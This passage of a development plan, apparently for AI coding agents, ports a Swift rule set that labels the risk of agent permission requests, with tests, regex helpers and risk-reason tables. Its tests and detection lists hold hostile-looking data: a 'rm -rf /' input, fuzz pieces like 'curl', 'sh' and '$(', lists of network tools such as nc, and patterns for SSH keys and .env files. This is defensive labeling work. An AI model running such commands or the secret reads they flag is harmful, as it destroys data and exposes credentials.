Expected: `# fail 0`, `✓ 10 fixture files match sidekick-core.js` and `✓ two generator runs write identical bytes` (the counts of `# tests` and `# pass` are the contract's own and are the same number).

Run: `node scripts/check-fixtures-additive.mjs 8df679a 2>&1 | tail -1`
Expected: `✓ fixtures changed only by addition since 8df679a`. This plan never edits `shared/sidekick-core.js`, a fixture of `tests/fixtures/` or anything under `windows/`.

- [ ] **Step 3: Check that the prerequisite round works, and read the base's numbers**

```bash
for f in scripts/test-hook-origin.sh scripts/test-hook-origin-wiring.sh scripts/test-fake-terminal-events.sh scripts/test-cat-desktop-wiring.sh scripts/test-cat-wiring.sh scripts/test-island-wing-wiring.sh scripts/test-shelf-wiring.sh scripts/test-shelf-drop.sh; do printf '%-48s' "$f"; bash "$f" 2>&1 | tail -1; done
```

Expected: eight lines, each ending `All tests passed.` (the base's numbers: write them down).

Run: `bash scripts/test-shortcuts.sh 2>&1 | tail -1; bash scripts/test-hotkeys.sh 2>&1 | tail -1`
Expected: `Shortcuts: 523 cases passed` and `HotKeyCenter: 19 cases passed`. This plan does not change either.

```bash
cd NotchBuddy && xcodegen && cd .. && xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -3
```

Expected: `Created project at …` and the last lines end with `** BUILD SUCCEEDED **` (a few minutes on a cold build, about 40 s when warm). The build only builds: **do not open the app.**

**A known base failure** (the dry run): `bash scripts/test-config-file-write.sh` prints `✗ resolving a plain file is that file` when `TMPDIR` is a path under `/private/tmp` (a symbolic link on a Mac). It is not touched by this plan; ignore that one line and do not "fix" it here.

- [ ] **Step 4: Read the base once**

Read, without changing: `NotchBuddy/Sources/App/HookServer.swift` (`processEvent`, `processPermissionRequest`, `processQuestionRequest`, `sendApprovalDecision`), `HookOrigin.swift`, `IslandTypes.swift` (`ApprovalInfo`, `IslandView`, `viewLayouts`), `IslandViewContent.swift` (`ApprovalView`, `OverviewView.openAgentTarget`, `NoteView`, `PromptView`), `IslandWindowController.swift` (`pollFrame`, the drop view's closures, `.hookExpand`), `FileDropView.swift`, `DesktopCatController.swift` (`start`, the observers), `CatSleep.swift` and `CatSleep+App.swift` (the one-shot clock's pattern), `CatSettingsStore.swift`, `SettingsView.swift` (the sidebar), `ClaudeService.swift` (`send`), `AI/AIService.swift` and `AI/Core/ModelRouter.swift`, and `docs/SIDEKICK-CONTRACT.md`. Nothing to report.

---

### Task 1: The risk rules: `explain`

**Agent:** `nm-implementer-light` (Haiku 5.5, medium). The code is given in full; the tests prove it.

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickText.swift`, `NotchBuddy/Sources/App/SidekickExplain.swift`, `tests/SidekickExplainTests.swift`, `scripts/test-sidekick-explain.sh`

**Interfaces:**
- Consumes: F1-0's `explain` in `shared/sidekick-core.js` (the tie-breaker) and `tests/fixtures/sidekick/explain-cases.json` (keys `reasons`, `cases`; each case has `agent`, `tool`, `input`, `cwd`, `home`, `risk`, `reasonId`, `line`, `target`; a null tool or input stands for a missing one), `tests/CatTestSupport.swift` (`CT`).
- Produces: `Rx` (`make`, `test`, `groups`, `all`, `wordStart`, `wordEnd`: ICU with JavaScript's `$` and `\b`; a pattern that ends a string ends with `\z`), `SK` (`minute`, `baseName(_:)`, `agentName(_:)`, `fnv1a(_:)`, `canon(_:depth:)`, `quote(_:)`, `commandKey(tool:input:)`, `maxDepth`), `SKExplanation` (`risk`, `reasonId`, `line`, `target`) and `SidekickExplain` (`reasons`, `resolvePath(_:_:_:)`, `pathsOf(_:_:)`, `writeTools`, `explain(agent:tool:input:cwd:home:)`). Every later task reads these names.

The risk rules label a permission request in one fixed line (`Deletes {name} and everything inside it.`) and a risk (`low`, `medium`, `high`). They **label only**: nothing here allows, denies or blocks a request, reads a file or starts a process, and no line ever holds a command, a path or an argument, only a basename. What the rules cannot read is `medium` and `unsure`. The port is a transcription of the core's `shellCandidates` and its helpers; every difference between ICU and JavaScript that mattered is handled once, in `Rx` (an ASCII `\b`, `$` as the very end of the string) and in `SK.baseName` (code points, not graphemes).

- [ ] **Step 1: Write the failing test**

The program checks the frozen table of 30 reasons, replays the 554 cases of the fixture, adds what the fixture cannot write (a tool that is not text, an input that is a list, a command of 20,001 characters, no `cwd` and no `home`), and fuzzes 3000 random commands of hostile pieces (quotes, `$(`, `<<`, `.env`, a bidi override, an emoji, a marker word) that must never throw, always give a known reason, and never put a `/`, a backtick, a line break or the marker into a line.

**Create `tests/SidekickExplainTests.swift`**

```swift
import Foundation

// The risk rules against tests/fixtures/sidekick/explain-cases.json, and what the fixture cannot write (a tool that is not text, an input that is not an object, a huge command, a
// fuzz of hostile text that must never throw and never leak a command, a path or an argument into a line). Run through scripts/test-sidekick-explain.sh.

@main
enum SidekickExplainTests {
    static func rows(_ x: Any?) -> [[String: Any]] { x as! [[String: Any]] }

    @MainActor static func main() {
        let fx = CT.fixture("explain-cases.json", dir: "sidekick")

        CT.section("the frozen reasons: \(rows(fx["reasons"]).count) ids with their risk and their line, in the contract's order")
        let want = rows(fx["reasons"]).map { "\($0["id"] as! String)|\($0["risk"] as! String)|\($0["line"] as! String)" }
        CT.check("the table is the contract's", SidekickExplain.reasons.map { "\($0.id)|\($0.risk)|\($0.line)" }, want)

        let cases = rows(fx["cases"])
        CT.section("explain: \(cases.count) cases, risk, reason, line and target each")
        var diffs: [String] = []
        for c in cases {
            let got = SidekickExplain.explain(agent: c["agent"] as? String, tool: c["tool"], input: c["input"], cwd: c["cwd"], home: c["home"])
            let w = SKExplanation(risk: c["risk"] as! String, reasonId: c["reasonId"] as! String, line: c["line"] as! String, target: c["target"] as? String ?? "")
            if got != w { diffs.append("\(c["name"] as! String): got \(got.risk)/\(got.reasonId) \"\(got.line)\" [\(got.target)], want \(w.risk)/\(w.reasonId) \"\(w.line)\" [\(w.target)]") }
        }
        CT.checkRows("every case gives the fixture's answer", diffs)

        CT.section("what the fixture cannot write")
        func e(_ tool: Any?, _ input: Any?, cwd: Any? = "/Users/me/proj", home: Any? = "/Users/me") -> SKExplanation { SidekickExplain.explain(tool: tool, input: input, cwd: cwd, home: home) }
        CT.check("a tool that is not text is no tool", e(42, ["command": "ls"]).reasonId, "unsure")
        CT.check("a missing tool is no tool", e(nil, nil).reasonId, "unsure")
        CT.check("a command that is not text or a list of text is unsure", e("Bash", ["command": 7]).reasonId, "unsure")
        CT.check("an input that is a list is no input", e("Bash", ["rm", "-rf", "/"]).reasonId, "unsure")
        CT.check("a command of 20,001 characters is not read: unsure", e("Bash", ["command": "sudo " + String(repeating: "a", count: 20001)]).reasonId, "unsure")
        CT.check("a command of 20,000 characters is still read", e("Bash", ["command": "sudo " + String(repeating: "a", count: 19995)]).reasonId, "sudo")
        CT.check("no cwd, no home: a relative path is inside", e("Edit", ["file_path": "a.txt"], cwd: nil, home: nil).reasonId, "edit_in_project")
        CT.check("an absolute path with no cwd is unsure for a write", e("Edit", ["file_path": "/etc/hosts"], cwd: nil, home: nil).reasonId, "unsure")

        CT.section("a fuzz of hostile text: never a throw, always a known reason, never the marker in the line")
        let marker = "ZZ-SECRET-MARKER-9137"
        let pieces = ["rm", "-rf", "sudo", "git", "push", "--force", "|", "&&", ";", "$(", "`", "'", "\"", "<<", ">", "2>&1", "~", "/", "..", ".env", marker, "\\", "\n", "curl", "sh", "-c", "bash", "(", ")", "{", "}", "*", "xargs", "env", "FOO=1", "\u{202E}", "é", "😀"]
        var seed: UInt64 = 0x9E3779B97F4A7C15
        func next() -> Int { seed = seed &* 6364136223846793005 &+ 1442695040888963407; return Int(seed >> 33) }
        var bad: [String] = []
        for _ in 0..<3000 {
            let n = 1 + next() % 12
            let cmd = (0..<n).map { _ in pieces[next() % pieces.count] }.joined(separator: next() % 3 == 0 ? "" : " ")
            let r = e("Bash", ["command": cmd])
            let known = SidekickExplain.reasons.contains { $0.id == r.reasonId }
            if !known { bad.append("unknown reason for \(cmd.debugDescription)") }
            if r.line.contains(marker) && !r.target.contains(marker) { bad.append("the marker leaked into a line: \(cmd.debugDescription)") }
            if r.line.contains("/") || r.line.contains("`") || r.line.contains("\n") { bad.append("a path or a command char in the line: \(r.line.debugDescription)") }
        }
        CT.checkRows("3000 random commands", bad)
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-explain.sh`**

```bash
#!/usr/bin/env bash
# Sidekick risk rules (explain): every case of tests/fixtures/sidekick/explain-cases.json, and what the fixture cannot write. Pure Foundation; nothing here launches NotchMeow.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-explain.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/SidekickText.swift $APP/SidekickExplain.swift \
    tests/CatTestSupport.swift tests/SidekickExplainTests.swift \
    -o "$TEST_DIR/sidekick-explain-tests"
"$TEST_DIR/sidekick-explain-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-explain.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-explain.sh`
Expected: FAIL. The compile stops with `error opening input file` for `NotchBuddy/Sources/App/SidekickText.swift` and `SidekickExplain.swift`.

- [ ] **Step 3: Write the helpers**

**Create `NotchBuddy/Sources/App/SidekickText.swift`**

```swift
import Foundation

// The sidekick's text helpers, shared by every rule: a small regular-expression kit (ICU, with the JavaScript meanings of `$` and `\b` that the contract's rules were
// written with), the basename of a path, the name of an agent, and the command key's hash. Port of the helpers of `shared/sidekick-core.js` (the tie-breaker;
// tests/fixtures/sidekick/ pins it, docs/SIDEKICK-CONTRACT.md explains it). Pure Foundation: no clock, no files, no network, no randomness, and it never throws.

enum Rx {
    private static let lock = NSLock()
    nonisolated(unsafe) private static var cache: [String: NSRegularExpression] = [:]

    /// A compiled pattern, kept. A pattern that does not compile is a programming error caught by the first test run.
    static func make(_ pattern: String, _ options: NSRegularExpression.Options = []) -> NSRegularExpression {
        let key = "\(options.rawValue)|\(pattern)"
        lock.lock(); defer { lock.unlock() }
        if let r = cache[key] { return r }
        let r = try! NSRegularExpression(pattern: pattern, options: options)
        cache[key] = r
        return r
    }

    /// JavaScript's `\b` is an ASCII word boundary; ICU's is a Unicode one. These two lookarounds are JavaScript's. `$` in a pattern means the very end (`\z`), not "before a final newline".
    static let wordStart = "(?<![A-Za-z0-9_])", wordEnd = "(?![A-Za-z0-9_])"

    static func test(_ pattern: String, _ s: String, _ options: NSRegularExpression.Options = []) -> Bool {
        make(pattern, options).firstMatch(in: s, range: NSRange(s.startIndex..., in: s)) != nil
    }

    /// The groups of the first match (group 0 first; a group that did not take part is nil), or nil when there is no match.
    static func groups(_ pattern: String, _ s: String, _ options: NSRegularExpression.Options = []) -> [String?]? {
        guard let m = make(pattern, options).firstMatch(in: s, range: NSRange(s.startIndex..., in: s)) else { return nil }
        return (0..<m.numberOfRanges).map { i in Range(m.range(at: i), in: s).map { String(s[$0]) } }
    }

    /// Every match of the pattern, each as its groups.
    static func all(_ pattern: String, _ s: String, _ options: NSRegularExpression.Options = []) -> [[String?]] {
        make(pattern, options).matches(in: s, range: NSRange(s.startIndex..., in: s)).map { m in
            (0..<m.numberOfRanges).map { i in Range(m.range(at: i), in: s).map { String(s[$0]) } }
        }
    }
}

enum SK {
    static let minute = 60000.0

    /// The last component of a path, `/` or `\` alike, without control and invisible characters (bidi overrides, zero-width marks, line separators), at most 60 code points
    /// (59 and `…` past that). Lines carry nothing else of a path.
    static func baseName(_ p: String) -> String {
        var u = Array(p.unicodeScalars)
        while let l = u.last, l == "/" || l == "\\" { u.removeLast() }
        if let i = u.lastIndex(where: { $0 == "/" || $0 == "\\" }) { u = Array(u[(i + 1)...]) }
        u = u.filter { !invisible($0.value) }
        if u.count > 60 { var v = String.UnicodeScalarView(); v.append(contentsOf: u[..<59]); return String(v) + "…" }
        var v = String.UnicodeScalarView(); v.append(contentsOf: u)
        return String(v)
    }

    private static func invisible(_ c: UInt32) -> Bool {
        (c <= 0x1F) || (0x7F...0x9F).contains(c) || c == 0xAD || c == 0x61C || c == 0x180E || (0x200B...0x200F).contains(c) || (0x202A...0x202E).contains(c)
            || c == 0x2028 || c == 0x2029 || c == 0x2060 || (0x2066...0x2069).contains(c) || c == 0xFEFF || (0xFFF9...0xFFFB).contains(c) || (0xE0000...0xE007F).contains(c)
    }

    /// The name of an agent for a person: Claude Code for `integration_claude`, `agent_<tag>` is the tag with a capital, and any other ID is "An agent".
    static func agentName(_ agentId: String?) -> String {
        guard let id = agentId else { return "An agent" }
        switch id {
        case "integration_claude": return "Claude Code"
        case "agent_cursor": return "Cursor"
        case "agent_codex": return "Codex"
        case "agent_gemini": return "Gemini CLI"
        case "agent_antigravity": return "Antigravity"
        default:
            guard id.hasPrefix("agent_") else { return "An agent" }
            let tag = String(id.dropFirst(6))
            guard let first = tag.first else { return "An agent" }
            return first.uppercased() + tag.dropFirst()
        }
    }

    // MARK: The command key

    /// FNV-1a, 32 bits, over the UTF-8 bytes of a string, as 8 lower-case hex digits.
    static func fnv1a(_ s: String) -> String {
        var h: UInt32 = 0x811c9dc5
        for b in s.utf8 { h ^= UInt32(b); h = h &* 0x01000193 }
        let hex = String(h, radix: 16)
        return String(repeating: "0", count: max(0, 8 - hex.count)) + hex
    }

    /// How deep an input may nest before its key is a fixed marker instead of a hash (the contract's `too-deep`): a hook payload from the socket is never deeper than JSONSerialization allows, and a
    /// recursion on hostile input must not run out of stack.
    static let maxDepth = 200

    /// Canonical JSON, as JavaScript's `JSON.stringify` writes it with the keys sorted (by UTF-16 code unit): no spaces. A whole number is written without a point. nil when `v` nests deeper than `maxDepth`.
    static func canon(_ v: Any?, depth: Int = 0) -> String? {
        guard depth <= maxDepth else { return nil }
        guard let v, !(v is NSNull) else { return "null" }
        if let n = v as? NSNumber {
            if CFGetTypeID(n) == CFBooleanGetTypeID() { return n.boolValue ? "true" : "false" }
            let d = n.doubleValue
            if !d.isFinite { return "null" }
            if d == d.rounded(), abs(d) < 1e15 { return String(Int64(d)) }
            return "\(d)"
        }
        if let s = v as? String { return quote(s) }
        if let a = v as? [Any] {
            var parts: [String] = []
            for x in a { guard let c = canon(x, depth: depth + 1) else { return nil }; parts.append(c) }
            return "[" + parts.joined(separator: ",") + "]"
        }
        if let o = v as? [String: Any] {
            let keys = o.keys.sorted { Array($0.utf16).lexicographicallyPrecedes(Array($1.utf16)) }
            var parts: [String] = []
            for k in keys { guard let c = canon(o[k], depth: depth + 1) else { return nil }; parts.append(quote(k) + ":" + c) }
            return "{" + parts.joined(separator: ",") + "}"
        }
        return "null"
    }

    /// A JSON string the way `JSON.stringify` writes it: quotes, backslash and the control characters escaped, everything else as it is.
    static func quote(_ s: String) -> String {
        var out = "\""
        for c in s.unicodeScalars {
            switch c {
            case "\"": out += "\\\""
            case "\\": out += "\\\\"
            case "\u{08}": out += "\\b"
            case "\u{0C}": out += "\\f"
            case "\n": out += "\\n"
            case "\r": out += "\\r"
            case "\t": out += "\\t"
            default:
                if c.value < 0x20 { out += String(format: "\\u%04x", c.value) } else { out.unicodeScalars.append(c) }
            }
        }
        return out + "\""
    }

    /// What "the same step" means: the tool name and a hash of its input, whitespace in a command folded. Only the hash is ever stored.
    static func commandKey(tool: String, input: Any?) -> String {
        var v = input
        if var o = input as? [String: Any], let c = o["command"] as? String {
            o["command"] = c.trimmingCharacters(in: .whitespacesAndNewlines).replacingOccurrences(of: "\\s+", with: " ", options: .regularExpression)
            v = o
        }
        guard let c = canon(v) else { return "\(tool)#too-deep" }
        return "\(tool)#\(fnv1a(c))"
    }
}
```

- [ ] **Step 4: Write the rules**

**Create `NotchBuddy/Sources/App/SidekickExplain.swift`**

```swift
import Foundation

// How risky is one permission request, in plain words. Port of `explain` in `shared/sidekick-core.js` (the tie-breaker); tests/fixtures/sidekick/explain-cases.json pins it and
// docs/SIDEKICK-CONTRACT.md has the decisions. It LABELS only: it never allows, denies or blocks anything (only the user's click does), it reads no file system and starts
// nothing, and its lines hold a basename and a fixed sentence, never a command, a path or an argument. It never throws: what it cannot read is `medium` / `unsure`.
// Pure Foundation. The regular expressions use `Rx` (ICU with JavaScript's `$` and `\b`), and a pattern that ends a string ends with `\z`.

struct SKExplanation: Equatable, Sendable {
    var risk: String
    var reasonId: String
    var line: String
    var target: String
}

enum SidekickExplain {
    // MARK: The reasons, in the order that breaks a tie (the earlier one wins)

    struct Reason: Sendable { var id: String; var risk: String; var line: String; var order: Int }
    static let reasons: [Reason] = {
        let rows: [(String, String, String)] = [
            ("git_history", "high", "Deletes this project's git history."),
            ("rm_recursive", "high", "Deletes {name} and everything inside it."),
            ("sudo", "high", "Runs a command with admin rights."),
            ("pipe_to_shell", "high", "Downloads a script and runs it at once."),
            ("chmod_recursive", "high", "Changes permissions on {name} and everything inside it."),
            ("git_force_push", "high", "Overwrites the remote branch history."),
            ("git_reset_hard", "high", "Throws away local changes."),
            ("git_clean", "high", "Deletes files git doesn't track."),
            ("disk_write", "high", "Writes straight to a disk."),
            ("sql_drop", "high", "Deletes a database table or database."),
            ("sql_delete_all", "high", "Changes every row in a table."),
            ("sensitive_file", "high", "Changes {name}, which can hold secrets or settings."),
            ("write_outside", "high", "Changes {name}, outside this project."),
            ("git_push", "medium", "Sends commits to a remote."),
            ("install", "medium", "Installs software."),
            ("network_fetch", "medium", "Talks to another computer."),
            ("container", "medium", "Controls containers."),
            ("lockfile_ci", "medium", "Changes {name}, which affects every build."),
            ("reads_secrets", "medium", "Reads {name}, which can hold secrets."),
            ("mcp_tool", "medium", "Uses a tool from an add-on."),
            ("unknown_tool", "medium", "Uses a tool NotchMeow doesn\u{2019}t know."),
            ("unsure", "medium", "Runs a command NotchMeow can't fully read."),
            ("outside_project", "medium", "Touches {name}, outside this project."),
            ("rm_in_project", "medium", "Deletes {name} in this project."),
            ("read_only", "low", "Only reads files."),
            ("test_build", "low", "Runs the project's own test or build script."),
            ("edit_in_project", "low", "Edits {name} in this project."),
            ("web", "low", "Reads a web page."),
            ("subagent", "low", "Starts a helper agent."),
            ("local_command", "low", "Does a simple local step."),
        ]
        return rows.enumerated().map { Reason(id: $1.0, risk: $1.1, line: $1.2, order: $0) }
    }()
    private static let reasonById: [String: Reason] = Dictionary(uniqueKeysWithValues: reasons.map { ($0.id, $0) })
    private static let riskRank = ["low": 0, "medium": 1, "high": 2]

    private struct Cand { var reason: String; var target: String = "" }
    private struct Word { var text: String; var quoted: Bool }
    private struct Redir { var out: Bool; var dup: Bool; var rw: Bool; var target: String }
    private struct Part { var args: [Word]; var redirs: [Redir]; var op: String }

    // MARK: Paths

    /// `p` against `cwd`: `~` and `$HOME` become `home`, `.` and `..` fold away, `\` is `/`. A relative path with no `cwd` stays relative.
    static func resolvePath(_ p: String, _ cwd: String, _ home: String) -> String {
        var s = p.replacingOccurrences(of: "\\", with: "/")
        if !home.isEmpty {
            var h = home.replacingOccurrences(of: "\\", with: "/")
            while h.hasSuffix("/") { h.removeLast() }
            for pre in ["~", "$HOME", "${HOME}"] where s.hasPrefix(pre) {
                let rest = s.dropFirst(pre.count)
                if rest.isEmpty || rest.hasPrefix("/") { s = h + rest; break }
            }
        }
        if !Rx.test("^(/|[A-Za-z]:/|~)", s) {
            var base = "."
            if !cwd.isEmpty { base = cwd.replacingOccurrences(of: "\\", with: "/"); while base.hasSuffix("/") { base.removeLast() } }
            s = base + "/" + s
        }
        var root = "", rest = Substring(s)
        if Rx.test("^[A-Za-z]:/", s) { root = String(s.prefix(3)); rest = s.dropFirst(3) }
        else if s.hasPrefix("/") { root = "/"; rest = s.dropFirst(1) }
        else if s.hasPrefix("~") { root = s.hasPrefix("~/") ? "~/" : "~"; rest = s.dropFirst(root.count) }
        var out: [String] = []
        for seg in rest.split(separator: "/", omittingEmptySubsequences: false) {
            if seg.isEmpty || seg == "." { continue }
            if seg == ".." { if let l = out.last, l != ".." { out.removeLast() } else if root.isEmpty { out.append("..") } } else { out.append(String(seg)) }
        }
        let r = root + out.joined(separator: "/")
        if r.utf16.count > 1, r.hasSuffix("/"), !Rx.test("^[A-Za-z]:/\\z", r) { return String(r.dropLast()) }
        return r.isEmpty ? "." : r
    }

    private static func isAbs(_ r: String) -> Bool { Rx.test("^(/|[A-Za-z]:/|~)", r) }
    private static func lc(_ r: String) -> String { Rx.test("^[A-Za-z]:/", r) ? r.lowercased() : r }
    private static func under(_ r: String, _ root: String) -> Bool {
        let a = lc(r), b = lc(root)
        return a == b || a.hasPrefix(b.hasSuffix("/") ? b : b + "/")
    }
    /// "inside", "outside" or "unknown" (an absolute path when the project folder is not known).
    private static func whereIs(_ p: String, _ cwd: String, _ home: String) -> String {
        let r = resolvePath(p, cwd, home)
        if cwd.isEmpty { return isAbs(r) ? "unknown" : (r.hasPrefix("..") ? "outside" : "inside") }
        return under(r, resolvePath(cwd, "", home)) ? "inside" : "outside"
    }
    private static func isHomeFolder(_ r: String, _ home: String) -> Bool {
        (!home.isEmpty && lc(r) == lc(resolvePath(home, "", ""))) || Rx.test("^(/(Users|home)/[^/]+|[A-Za-z]:/Users/[^/]+)\\z", r, .caseInsensitive) || r == "~"
    }

    // MARK: What a file path means

    private static let shellRC: Set<String> = [".bashrc", ".bash_profile", ".bash_login", ".bash_logout", ".profile", ".zshrc", ".zshenv", ".zprofile", ".zlogin", ".zlogout", "config.fish"]
    private static let lockfiles: Set<String> = ["package-lock.json", "yarn.lock", "pnpm-lock.yaml", "bun.lockb", "Cargo.lock", "Gemfile.lock", "poetry.lock", "Pipfile.lock", "composer.lock", "go.sum", "Podfile.lock", "Package.resolved", ".gitlab-ci.yml", "Jenkinsfile", "azure-pipelines.yml"]
    private static let secretNames: Set<String> = [".npmrc", ".netrc", ".pypirc", ".mcp.json", ".pgpass", ".yarnrc.yml", ".gitmodules", "kubeconfig"]
    private static let sourceExt = "\\.(ts|tsx|js|jsx|mjs|cjs|py|rs|go|swift|kt|java|rb|md|txt|css|scss|less|html)\\z"

    private static func sensitivePath(_ r: String) -> Bool {
        let b = baseName(r).lowercased()
        let stem = b.split(separator: ".", maxSplits: 1, omittingEmptySubsequences: false).first.map(String.init) ?? ""
        let keyword = Rx.test("credential|secret|token|passw", b) && !(Rx.test(sourceExt, b) && stem != "credentials" && stem != "secrets")
        if b.hasPrefix(".env") || b.hasSuffix(".env") || secretNames.contains(b) || b.hasPrefix("terraform.tfstate") || keyword
            || Rx.test("\\.(pem|key|p12|pfx|keystore|jks|p8|tfvars)\\z", b) || Rx.test("^id_(rsa|dsa|ecdsa|ed25519)(_sk)?([._-].*)?\\z", b) || shellRC.contains(b) { return true }
        if Rx.test("(^|/)(\\.git/(?!objects/|refs/|logs/)|\\.husky(/|\\z)|\\.githooks(/|\\z)|\\.claude/(hooks|commands)(/|\\z)|\\.(vscode|cursor)/(tasks|mcp|launch|settings)\\.json\\z)", r, .caseInsensitive)
            || Rx.test("(^|/)\\.claude/settings[^/]*\\.json\\z", r, .caseInsensitive) { return true }
        return Rx.test("(^|/)\\.(ssh|aws|gnupg|kube|docker)(/|\\z)", r, .caseInsensitive) || Rx.test("(^|/)\\.config/gh(/|\\z)", r, .caseInsensitive) || Rx.test("(^|/)secrets(/|\\z)", r, .caseInsensitive)
    }

    private static func baseName(_ p: String) -> String { SK.baseName(p) }
    private static func lockOrCi(_ r: String) -> Bool { lockfiles.contains(baseName(r)) || Rx.test("(^|/)\\.github/workflows/", r) || Rx.test("(^|/)\\.circleci/", r) }

    /// The candidate for writing to one path.
    private static func writeCandidate(_ p: String, _ cwd: String, _ home: String) -> Cand {
        let r = resolvePath(p, cwd, home), w = whereIs(p, cwd, home)
        if sensitivePath(r) { return Cand(reason: "sensitive_file", target: baseName(r)) }
        if w == "outside" { return Cand(reason: "write_outside", target: baseName(r)) }
        if w == "unknown" { return Cand(reason: "unsure") }
        if lockOrCi(r) { return Cand(reason: "lockfile_ci", target: baseName(r)) }
        return Cand(reason: "edit_in_project", target: baseName(r))
    }

    // MARK: Shell commands

    /// Splits a command at `&&`, `||`, `;`, `|`, `&`, newlines, `(` and `)`, respecting quotes. `opaque` says some of the text can't be followed as words: `$(…)`, backticks, `<(…)`,
    /// a subshell, a here-document or an open quote. `ps` (PowerShell) reads `\` as a path separator, not an escape.
    private static func splitShell(_ cmd: String, _ ps: Bool) -> (parts: [Part], opaque: Bool) {
        let s = Array(cmd.unicodeScalars)
        struct Tok { var text: String; var quoted: Bool; var redir = false; var out = false; var dup = false; var rw = false }
        var parts: [Part] = [], toks: [Tok] = [], cur = "", has = false, quoted = false, q: Unicode.Scalar? = nil, opaque = false
        func push() { if has { toks.append(Tok(text: cur, quoted: quoted)) }; cur = ""; has = false; quoted = false }
        func end(_ op: String) {
            push()
            var args: [Word] = [], redirs: [Redir] = []
            var k = 0
            while k < toks.count {
                if toks[k].redir {
                    if k + 1 < toks.count { redirs.append(Redir(out: toks[k].out, dup: toks[k].dup, rw: toks[k].rw, target: toks[k + 1].text)) }
                    k += 1
                } else { args.append(Word(text: toks[k].text, quoted: toks[k].quoted)) }
                k += 1
            }
            parts.append(Part(args: args, redirs: redirs, op: op))
            toks = []
        }
        func at(_ i: Int) -> Unicode.Scalar? { i >= 0 && i < s.count ? s[i] : nil }
        func isDigits(_ t: String) -> Bool { t.unicodeScalars.allSatisfy { $0.value >= 48 && $0.value <= 57 } }
        var i = 0
        while i < s.count {
            let c = s[i]
            if q == "'" { if c == "'" { q = nil } else { cur.unicodeScalars.append(c) }; i += 1; continue }
            if q == "\"" {
                if c == "\"" { q = nil }
                else if c == "\\", !ps, i + 1 < s.count, "$`\"\\\n".unicodeScalars.contains(s[i + 1]) { i += 1; cur.unicodeScalars.append(s[i]) }
                else { if c == "`" || (c == "$" && at(i + 1) == "(") { opaque = true }; cur.unicodeScalars.append(c) }
                i += 1; continue
            }
            if c == "'" || c == "\"" { q = c; has = true; quoted = true; i += 1; continue }
            if c == "\\" {
                if ps { cur.unicodeScalars.append(c); has = true } else if i + 1 < s.count { i += 1; cur.unicodeScalars.append(s[i]); has = true }
                i += 1; continue
            }
            if c == "`" || c == "(" || c == ")" { opaque = true; end(String(c)); i += 1; continue }
            if (c == "$" || c == "<" || c == ">"), at(i + 1) == "(" {
                opaque = true
                if c != "$" { push(); toks.append(Tok(text: String(c) + "(", quoted: false)) }
                i += 1; continue
            }
            if c == "<", at(i + 1) == "<" { opaque = true }
            if c == " " || c == "\t" || c == "\r" { push(); i += 1; continue }
            if c == "\n" { end("\n"); i += 1; continue }
            if c == ";" { end(";"); i += 1; continue }
            if c == "&", at(i + 1) == "&" { end("&&"); i += 2; continue }
            if c == "|", at(i + 1) == "|" { end("||"); i += 2; continue }
            if c == "|" { if at(i + 1) == "&" { i += 1 }; end("|"); i += 1; continue }
            if c == "&", at(i + 1) == ">" { i += 1; continue }
            if c == "&" { end("&"); i += 1; continue }
            if c == ">" || c == "<" {
                if !isDigits(cur) || quoted { push() } else { cur = ""; has = false }
                var op = String(c)
                while at(i + 1) == c { i += 1; op.unicodeScalars.append(c) }
                if c == ">", at(i + 1) == "|" { i += 1 }
                var dupText: String? = nil
                if c == ">", at(i + 1) == "&" {
                    var j = i + 2, t = ""
                    if let d = at(j), d == "-" { t = "-" } else { while let d = at(j), d.value >= 48 && d.value <= 57 { t.unicodeScalars.append(d); j += 1 } }
                    if !t.isEmpty { dupText = t }
                    i += 1
                }
                var rw = false
                if c == "<", at(i + 1) == ">" { rw = true; i += 1 }
                toks.append(Tok(text: op, quoted: false, redir: true, out: c == ">" || rw, dup: dupText != nil, rw: rw))
                if let t = dupText { toks.append(Tok(text: "&" + t, quoted: false)); i += t.unicodeScalars.count }
                i += 1; continue
            }
            cur.unicodeScalars.append(c); has = true; i += 1
        }
        if q != nil { opaque = true }
        end("")
        return (parts.filter { !$0.args.isEmpty || !$0.redirs.isEmpty }, opaque)
    }

    private static let shells: Set<String> = ["sh", "bash", "zsh", "dash", "fish", "ksh", "csh", "tcsh", "ash"]
    private static let writeCmds: Set<String> = ["cp", "mv", "ln", "touch", "mkdir", "install", "tee"]
    private static let writeFlags: Set<String> = ["sensitive_file", "write_outside", "unsure", "lockfile_ci"]
    private static let outFlag: [String: (String, String)] = ["sort": ("o", "--output"), "curl": ("o", "--output"), "wget": ("O", "--output-document")]
    private static let readers: Set<String> = ["cat", "tac", "less", "more", "head", "tail", "grep", "egrep", "fgrep", "rg", "ag", "xxd", "od", "hexdump", "strings", "sort", "uniq", "cut", "nl", "wc", "jq", "base64", "sed", "awk"]
    private static let progFirst: Set<String> = ["grep", "egrep", "fgrep", "rg", "ag", "sed", "awk", "jq"]
    private static let gitReads: Set<String> = ["diff", "show", "log", "blame", "grep", "cat-file"]
    private static let execKey = "^(core\\.(askpass|sshcommand|hookspath|pager|fsmonitor|editor|gitproxy|alternaterefscommand)|uploadpack\\.packobjectshook|submodule\\..+\\.update|tar\\..+\\.command|sequence\\.editor|filter\\..+|diff\\.(.+\\.)?(external|textconv|command)|merge\\..+\\.driver|gpg\\.(.+\\.)?program|credential\\..*helper|includeif?\\..+|alias\\..+|pager\\..+|(difftool|mergetool)\\..+\\.cmd|interactive\\.difffilter)\\z"
    private static let gitNet: Set<String> = ["fetch", "pull", "clone"]
    private static let installSubs: Set<String> = ["install", "i", "add", "ci", "update", "upgrade", "remove", "uninstall", "link", "sync", "require", "reinstall"]
    private static let netCmds: Set<String> = ["curl", "wget", "ssh", "scp", "sftp", "rsync", "nc", "ncat", "ftp", "telnet"]
    private static let containerCmds: Set<String> = ["docker", "podman", "kubectl", "helm", "docker-compose", "minikube"]
